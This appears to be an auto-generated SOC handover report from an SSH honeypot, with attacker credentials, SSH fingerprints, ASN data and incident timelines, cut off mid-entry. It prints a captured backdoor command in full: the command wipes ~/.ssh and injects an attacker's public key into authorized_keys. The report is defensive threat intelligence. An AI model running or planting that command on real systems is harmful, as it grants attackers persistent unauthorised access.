# 🛡 THIR · SOC Shift Handover Report

| Field | Value |
|---|---|
| **Report Date** | 2026-08-08 |
| **Generated At** | 2026-08-08T14:35:53Z |
| **Shift Time** | 14:35 UTC |
| **Honeypot Status** | ✅ HEALTHY |
| **Source** | Cowrie SSH Honeypot · Oracle Cloud HA · Port 2222 |

---

## 📊 Executive Summary

| Metric | Value |
|---|---|
| Total Sessions Captured | **120** |
| Confirmed Threats | **99** |
| False Positives Filtered | **21** (17.5%) |
| Unique Attacker IPs | **71** |
| Countries of Origin | **25** |
| High Severity Cases | **41** |
| Medium Severity Cases | **0** |
| Low Severity Cases | **79** |
| Malware Samples Analyzed | **2** HIGH · **24** MED · 20 empty upload attempt(s) |

---

## 🔑 Credential Intelligence

| Metric | Value |
|---|---|
| Total Auth Attempts | **56** |
| Unique Credential Pairs | **27** |
| Unique Usernames | **19** |
| Unique Passwords | **23** |
| Successful Auth Pairs | **46** |

**Top Usernames:**

| Username | Attempts |
|---|---|
| `support` | 9 |
| `root` | 8 |
| `ubnt` | 6 |
| `admin` | 4 |
| `Test` | 4 |

**Top Passwords:**

| Password | Attempts |
|---|---|
| `support` | 5 |
| `root2004` | 4 |
| `123456` | 4 |
| `Host: 129.80.119.236:23` | 4 |
| `blank` | 3 |

**Top Credential Pairs:**

| Username | Password | Attempts |
|---|---|---|
| `support` | `support` | 5 |
| `root` | `root2004` | 4 |
| `Test` | `123456` | 4 |
| `blank` | `blank` | 3 |
| `test` | `1234` | 3 |

**⚠️ Successful Auth Pairs (Priority — cross-reference with IR cases):**

| Username | Password | Source IP | Timestamp |
|---|---|---|---|
| `ubuntu` | `temppwd` | `10.0.0.73` | 2026-08-08T10:58:06 |
| `root` | `Admin@123#` | `98.70.50.166` | 2026-08-08T10:58:14 |
| `345gs5662d34` | `345gs5662d34` | `98.70.50.166` | 2026-08-08T10:58:18 |
| `root` | `3245gs5662d34` | `98.70.50.166` | 2026-08-08T10:58:19 |
| `admin` | `lamer2398` | `62.220.104.155` | 2026-08-08T11:01:00 |
| `admin` | `lamer2398` | `189.56.0.19` | 2026-08-08T11:01:14 |
| `support` | `support` | `176.53.159.196` | 2026-08-08T11:02:11 |
| `root` | `root2004` | `111.70.32.53` | 2026-08-08T11:11:18 |
| `root` | `root2004` | `111.34.17.94` | 2026-08-08T11:11:32 |
| `root` | `root2004` | `10.0.0.73` | 2026-08-08T11:11:41 |
| `root` | ` ` | `35.200.201.144` | 2026-08-08T11:15:24 |
| `blank` | `blank` | `10.0.0.73` | 2026-08-08T11:17:20 |
| `blank` | `blank` | `202.72.196.75` | 2026-08-08T11:19:06 |
| `blank` | `blank` | `178.178.194.134` | 2026-08-08T11:19:15 |
| `test` | `1234` | `62.182.132.94` | 2026-08-08T11:20:46 |
| `support` | `support` | `10.0.0.73` | 2026-08-08T11:21:51 |
| `root` | `ubuntu` | `177.74.153.10` | 2026-08-08T11:26:14 |
| `admin` | `admin888` | `10.0.0.73` | 2026-08-08T11:26:57 |
| `user` | `user2015` | `183.167.234.154` | 2026-08-08T11:31:20 |
| `user` | `user2015` | `37.25.36.197` | 2026-08-08T11:31:27 |
| `user` | `user2015` | `10.0.0.73` | 2026-08-08T11:34:51 |
| `admin` | `admin888` | `185.255.212.178` | 2026-08-08T11:45:38 |
| `test` | `1234` | `103.251.143.14` | 2026-08-08T11:49:56 |
| `test` | `1234` | `65.20.202.4` | 2026-08-08T11:50:03 |
| `user1` | `password` | `207.219.222.29` | 2026-08-08T11:53:24 |
| `user1` | `password` | `179.181.133.153` | 2026-08-08T11:53:32 |
| `support` | `support2007` | `196.219.93.98` | 2026-08-08T11:57:19 |
| `support` | `support2007` | `113.219.177.95` | 2026-08-08T11:57:32 |
| `ubnt` | `Ubnt2010` | `196.189.126.10` | 2026-08-08T12:20:18 |
| `ubnt` | `Ubnt2010` | `223.107.146.186` | 2026-08-08T12:20:27 |
| `ubnt` | `Ubnt2010` | `138.118.213.68` | 2026-08-08T12:20:27 |
| `ubnt` | `ubnt2020` | `65.20.179.251` | 2026-08-08T12:20:29 |
| `ubnt` | `ubnt2020` | `10.0.0.73` | 2026-08-08T12:20:48 |
| `Test` | `123456` | `10.0.0.73` | 2026-08-08T12:26:18 |
| `Test` | `123456` | `92.62.74.41` | 2026-08-08T12:27:56 |
| `Test` | `123456` | `218.200.9.182` | 2026-08-08T12:28:10 |
| `operator` | `Passw@rd` | `146.255.228.189` | 2026-08-08T12:29:49 |
| `default` | `ubuntu` | `10.0.0.73` | 2026-08-08T12:35:55 |
| `GET / HTTP/1.0` | `` | `165.245.211.148` | 2026-08-08T12:41:16 |
| `OPTIONS / HTTP/1.0` | `` | `165.245.211.148` | 2026-08-08T12:41:21 |
| `OPTIONS / RTSP/1.0` | `` | `165.245.211.148` | 2026-08-08T12:41:26 |
| `OPTIONS sip:nm SIP/2.0` | `Via: SIP/2.0/TCP nm;branch=foo` | `165.245.211.148` | 2026-08-08T12:42:04 |
| `GET / HTTP/1.1` | `Host: 129.80.119.236:23` | `165.245.241.157` | 2026-08-08T12:42:12 |
| `GET /query?q=SHOW+DIAGNOSTICS HTTP/1.1` | `Host: 129.80.119.236:23` | `165.22.80.11` | 2026-08-08T12:42:13 |
| `support` | `support2003` | `101.13.5.50` | 2026-08-08T12:43:38 |
| `support` | `support2003` | `10.0.0.73` | 2026-08-08T12:43:59 |

---

## 🖥 SSH Fingerprint Intelligence

| Metric | Value |
|---|---|
| Total Sessions Parsed | **120** |
| Sessions with Fingerprint | **7** |
| Unique HASSH Fingerprints | **7** |

**Client Family Distribution:**

| Client Family | Sessions |
|---|---|
| OpenSSH | 25 |
| libssh | 7 |
| Go SSH scanner | 5 |
| Paramiko (Python) | 2 |

**⚠️ Botnet/Scanner KEX Signatures Detected:**

| HASSH | Signature | Sessions | IPs |
|---|---|---|---|
| `acaa53e0a7d7...` | Mirai/variant | 25 | 25 |
| `f555226df196...` | Mirai/variant | 3 | 1 |
| `eff4c24daffc...` | Modern SSH client | 3 | 1 |
| `a704be057881...` | Mirai/variant | 2 | 1 |
| `4e066189c3bb...` | Generic scanner | 1 | 1 |

**Top Fingerprints:**

| HASSH | Client | Sessions | IPs | Botnet Sig |
|---|---|---|---|---|
| `acaa53e0a7d7...` | OpenSSH | 25 | 25 | Mirai/variant |
| `95420f9d932d...` | libssh | 4 | 1 | — |
| `f555226df196...` | libssh | 3 | 1 | Mirai/variant |
| `eff4c24daffc...` | Go SSH scanner | 3 | 1 | Modern SSH client |
| `a704be057881...` | Paramiko (Python) | 2 | 1 | Mirai/variant |
| `4e066189c3bb...` | Go SSH scanner | 1 | 1 | Generic scanner |
| `98ddc5604ef6...` | Go SSH scanner | 1 | 1 | Modern SSH client |

---

## ⚔️ Attack Campaign Intelligence

| Metric | Value |
|---|---|
| Total Command Clusters | **4** |
| Campaign Clusters | **1** |
| Highest Severity | **HIGH** |

**Active Campaigns:**

| Campaign | Severity | Sessions | IPs | TTPs |
|---|---|---|---|---|
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 1 | 1 | `T1021.004, T1078, T1070, T1140` |

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
Source IPs: `98.70.50.166`

---

## 🌐 ASN Cluster Intelligence

| Metric | Value |
|---|---|
| Total IPs Analysed | **71** |
| Unique ASNs | **53** |
| High-Risk ASNs | **44** |
| Anon Infrastructure ASNs | **0** |

**Top Attack ASNs:**

| ASN | Provider | IPs | Risk |
|---|---|---|---|
| `AS46562` | Performive LLC | 7 | MEDIUM |
| `AS14061` | DigitalOcean, LLC | 5 | HIGH |
| `AS22773` | Cox Communications Inc. | 3 | MEDIUM |
| `AS63949` | Akamai Connected Cloud | 3 | HIGH |
| `AS48721` | Flyservers S.A. | 2 | HIGH |
| `AS9808` | China Mobile Communications Group Co., Ltd. | 2 | HIGH |
| `AS203214` | Hulum Almustakbal Company for Communication Engineering and Services Ltd | 2 | HIGH |
| `AS4134` | CHINANET BACKBONE | 2 | HIGH |

---

---

## 🚨 Priority Cases — Immediate Attention (41)

> Cases with auth success, command execution, or file downloads.
> Each requires individual review. Never grouped.

### 🔴 HIGH · IR-98f1d482c64a

| Field | Detail |
|---|---|
| **Source IP** | `98.70.50[.]166` |
| **First Seen** | 2026-08-08 10:58 |
| **Last Seen** | 2026-08-08 10:58 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-08 10:58:13` | `cowrie.session.connect` |
| `2026-08-08 10:58:13` | `cowrie.client.version` |
| `2026-08-08 10:58:13` | `cowrie.client.kex` |
| `2026-08-08 10:58:14` | `cowrie.login.success` |
| `2026-08-08 10:58:15` | `cowrie.session.params` |
| `2026-08-08 10:58:15` | `cowrie.command.input` |
| `2026-08-08 10:58:15` | `cowrie.command.failed` |
| `2026-08-08 10:58:16` | `cowrie.log.closed` |
| `2026-08-08 10:58:16` | `cowrie.session.params` |
| `2026-08-08 10:58:16` | `cowrie.command.input` |
| `2026-08-08 10:58:17` | `cowrie.session.file_download` |
| `2026-08-08 10:58:17` | `cowrie.log.closed` |
| `2026-08-08 10:58:20` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `98.70.50[.]166` to AbuseIPDB if not already reported
- [ ] Block `98.70.50[.]166` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ead1cd832847

| Field | Detail |
|---|---|
| **Source IP** | `98.70.50[.]166` |
| **First Seen** | 2026-08-08 10:58 |
| **Last Seen** | 2026-08-08 10:58 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-08 10:58:17` | `cowrie.session.connect` |
| `2026-08-08 10:58:17` | `cowrie.client.version` |
| `2026-08-08 10:58:17` | `cowrie.client.kex` |
| `2026-08-08 10:58:18` | `cowrie.login.success` |
| `2026-08-08 10:58:18` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `98.70.50[.]166` to AbuseIPDB if not already reported
- [ ] Block `98.70.50[.]166` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f4fb02791fed

| Field | Detail |
|---|---|
| **Source IP** | `98.70.50[.]166` |
| **First Seen** | 2026-08-08 10:58 |
| **Last Seen** | 2026-08-08 10:58 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-08 10:58:18` | `cowrie.session.connect` |
| `2026-08-08 10:58:18` | `cowrie.client.version` |
| `2026-08-08 10:58:19` | `cowrie.client.kex` |
| `2026-08-08 10:58:19` | `cowrie.login.success` |
| `2026-08-08 10:58:20` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `98.70.50[.]166` to AbuseIPDB if not already reported
- [ ] Block `98.70.50[.]166` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-13666ec2d1f5

| Field | Detail |
|---|---|
| **Source IP** | `62.220.104[.]155` |
| **First Seen** | 2026-08-08 11:00 |
| **Last Seen** | 2026-08-08 11:01 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-08 11:00:58` | `cowrie.session.connect` |
| `2026-08-08 11:00:58` | `cowrie.client.version` |
| `2026-08-08 11:00:58` | `cowrie.client.kex` |
| `2026-08-08 11:01:00` | `cowrie.login.success` |
| `2026-08-08 11:01:00` | `cowrie.direct-tcpip.request` |
| `2026-08-08 11:01:05` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `62.220.104[.]155` to AbuseIPDB if not already reported
- [ ] Block `62.220.104[.]155` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-577f01ad57aa

| Field | Detail |
|---|---|
| **Source IP** | `189.56.0[.]19` |
| **First Seen** | 2026-08-08 11:01 |
| **Last Seen** | 2026-08-08 11:01 |
| **Session Duration** | 14s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-08 11:01:05` | `cowrie.session.connect` |
| `2026-08-08 11:01:06` | `cowrie.client.version` |
| `2026-08-08 11:01:06` | `cowrie.client.kex` |
| `2026-08-08 11:01:14` | `cowrie.login.success` |
| `2026-08-08 11:01:15` | `cowrie.direct-tcpip.request` |
| `2026-08-08 11:01:20` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `189.56.0[.]19` to AbuseIPDB if not already reported
- [ ] Block `189.56.0[.]19` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c531657b681c

| Field | Detail |
|---|---|
| **Source IP** | `176.53.159[.]196` |
| **First Seen** | 2026-08-08 11:02 |
| **Last Seen** | 2026-08-08 11:02 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-08 11:02:10` | `cowrie.session.connect` |
| `2026-08-08 11:02:11` | `cowrie.client.version` |
| `2026-08-08 11:02:11` | `cowrie.client.kex` |
| `2026-08-08 11:02:11` | `cowrie.login.success` |
| `2026-08-08 11:02:11` | `cowrie.direct-tcpip.request` |
| `2026-08-08 11:02:11` | `cowrie.direct-tcpip.data` |
| `2026-08-08 11:02:11` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `176.53.159[.]196` to AbuseIPDB if not already reported
- [ ] Block `176.53.159[.]196` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-874e2d29e031

| Field | Detail |
|---|---|
| **Source IP** | `111.70.32[.]53` |
| **First Seen** | 2026-08-08 11:11 |
| **Last Seen** | 2026-08-08 11:11 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-08 11:11:16` | `cowrie.session.connect` |
| `2026-08-08 11:11:17` | `cowrie.client.version` |
| `2026-08-08 11:11:17` | `cowrie.client.kex` |
| `2026-08-08 11:11:18` | `cowrie.login.success` |
| `2026-08-08 11:11:19` | `cowrie.direct-tcpip.request` |
| `2026-08-08 11:11:24` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `111.70.32[.]53` to AbuseIPDB if not already reported
- [ ] Block `111.70.32[.]53` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8ff9ad9487cb

| Field | Detail |
|---|---|
| **Source IP** | `111.34.17[.]94` |
| **First Seen** | 2026-08-08 11:11 |
| **Last Seen** | 2026-08-08 11:11 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-08 11:11:29` | `cowrie.session.connect` |
| `2026-08-08 11:11:29` | `cowrie.client.version` |
| `2026-08-08 11:11:29` | `cowrie.client.kex` |
| `2026-08-08 11:11:32` | `cowrie.login.success` |
| `2026-08-08 11:11:32` | `cowrie.direct-tcpip.request` |
| `2026-08-08 11:11:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `111.34.17[.]94` to AbuseIPDB if not already reported
- [ ] Block `111.34.17[.]94` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a8d7ecf01b7f

| Field | Detail |
|---|---|
| **Source IP** | `35.200.201[.]144` |
| **First Seen** | 2026-08-08 11:15 |
| **Last Seen** | 2026-08-08 11:15 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-08 11:15:23` | `cowrie.session.connect` |
| `2026-08-08 11:15:23` | `cowrie.client.version` |
| `2026-08-08 11:15:24` | `cowrie.client.kex` |
| `2026-08-08 11:15:24` | `cowrie.login.success` |
| `2026-08-08 11:15:25` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `35.200.201[.]144` to AbuseIPDB if not already reported
- [ ] Block `35.200.201[.]144` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-46d0b9778e1c

| Field | Detail |
|---|---|
| **Source IP** | `202.72.196[.]75` |
| **First Seen** | 2026-08-08 11:19 |
| **Last Seen** | 2026-08-08 11:22 |
| **Session Duration** | 189s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-08 11:19:03` | `cowrie.session.connect` |
| `2026-08-08 11:19:04` | `cowrie.client.version` |
| `2026-08-08 11:19:04` | `cowrie.client.kex` |
| `2026-08-08 11:19:06` | `cowrie.login.success` |
| `2026-08-08 11:19:06` | `cowrie.direct-tcpip.request` |
| `2026-08-08 11:22:13` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `202.72.196[.]75` to AbuseIPDB if not already reported
- [ ] Block `202.72.196[.]75` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1683067580cc

| Field | Detail |
|---|---|
| **Source IP** | `178.178.194[.]134` |
| **First Seen** | 2026-08-08 11:19 |
| **Last Seen** | 2026-08-08 11:19 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-08 11:19:12` | `cowrie.session.connect` |
| `2026-08-08 11:19:13` | `cowrie.client.version` |
| `2026-08-08 11:19:13` | `cowrie.client.kex` |
| `2026-08-08 11:19:15` | `cowrie.login.success` |
| `2026-08-08 11:19:15` | `cowrie.direct-tcpip.request` |
| `2026-08-08 11:19:19` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `178.178.194[.]134` to AbuseIPDB if not already reported
- [ ] Block `178.178.194[.]134` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-baf6ec73872f

| Field | Detail |
|---|---|
| **Source IP** | `62.182.132[.]94` |
| **First Seen** | 2026-08-08 11:20 |
| **Last Seen** | 2026-08-08 11:20 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-08 11:20:44` | `cowrie.session.connect` |
| `2026-08-08 11:20:45` | `cowrie.client.version` |
| `2026-08-08 11:20:45` | `cowrie.client.kex` |
| `2026-08-08 11:20:46` | `cowrie.login.success` |
| `2026-08-08 11:20:46` | `cowrie.direct-tcpip.request` |
| `2026-08-08 11:20:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `62.182.132[.]94` to AbuseIPDB if not already reported
- [ ] Block `62.182.132[.]94` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1071f8b512de

| Field | Detail |
|---|---|
| **Source IP** | `177.74.153[.]10` |
| **First Seen** | 2026-08-08 11:26 |
| **Last Seen** | 2026-08-08 11:27 |
| **Session Duration** | 54s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-08 11:26:13` | `cowrie.session.connect` |
| `2026-08-08 11:26:13` | `cowrie.client.version` |
| `2026-08-08 11:26:13` | `cowrie.client.kex` |
| `2026-08-08 11:26:14` | `cowrie.login.success` |
| `2026-08-08 11:27:07` | `cowrie.session.file_upload` |
| `2026-08-08 11:27:07` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `177.74.153[.]10` to AbuseIPDB if not already reported
- [ ] Block `177.74.153[.]10` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0b3d71159278

| Field | Detail |
|---|---|
| **Source IP** | `183.167.234[.]154` |
| **First Seen** | 2026-08-08 11:31 |
| **Last Seen** | 2026-08-08 11:31 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-08 11:31:17` | `cowrie.session.connect` |
| `2026-08-08 11:31:18` | `cowrie.client.version` |
| `2026-08-08 11:31:18` | `cowrie.client.kex` |
| `2026-08-08 11:31:20` | `cowrie.login.success` |
| `2026-08-08 11:31:20` | `cowrie.direct-tcpip.request` |
| `2026-08-08 11:31:25` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `183.167.234[.]154` to AbuseIPDB if not already reported
- [ ] Block `183.167.234[.]154` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ae893c4f979c

| Field | Detail |
|---|---|
| **Source IP** | `37.25.36[.]197` |
| **First Seen** | 2026-08-08 11:31 |
| **Last Seen** | 2026-08-08 11:31 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-08 11:31:26` | `cowrie.session.connect` |
| `2026-08-08 11:31:26` | `cowrie.client.version` |
| `2026-08-08 11:31:26` | `cowrie.client.kex` |
| `2026-08-08 11:31:27` | `cowrie.login.success` |
| `2026-08-08 11:31:27` | `cowrie.direct-tcpip.request` |
| `2026-08-08 11:31:32` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `37.25.36[.]197` to AbuseIPDB if not already reported
- [ ] Block `37.25.36[.]197` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e0d91ebe8f5b

| Field | Detail |
|---|---|
| **Source IP** | `185.255.212[.]178` |
| **First Seen** | 2026-08-08 11:45 |
| **Last Seen** | 2026-08-08 11:45 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-08 11:45:36` | `cowrie.session.connect` |
| `2026-08-08 11:45:36` | `cowrie.client.version` |
| `2026-08-08 11:45:36` | `cowrie.client.kex` |
| `2026-08-08 11:45:38` | `cowrie.login.success` |
| `2026-08-08 11:45:40` | `cowrie.direct-tcpip.request` |
| `2026-08-08 11:45:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `185.255.212[.]178` to AbuseIPDB if not already reported
- [ ] Block `185.255.212[.]178` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-08e0e96430ed

| Field | Detail |
|---|---|
| **Source IP** | `103.251.143[.]14` |
| **First Seen** | 2026-08-08 11:49 |
| **Last Seen** | 2026-08-08 11:50 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-08 11:49:53` | `cowrie.session.connect` |
| `2026-08-08 11:49:54` | `cowrie.client.version` |
| `2026-08-08 11:49:54` | `cowrie.client.kex` |
| `2026-08-08 11:49:56` | `cowrie.login.success` |
| `2026-08-08 11:49:56` | `cowrie.direct-tcpip.request` |
| `2026-08-08 11:50:01` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.251.143[.]14` to AbuseIPDB if not already reported
- [ ] Block `103.251.143[.]14` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-36f3b425b699

| Field | Detail |
|---|---|
| **Source IP** | `65.20.202[.]4` |
| **First Seen** | 2026-08-08 11:50 |
| **Last Seen** | 2026-08-08 11:50 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
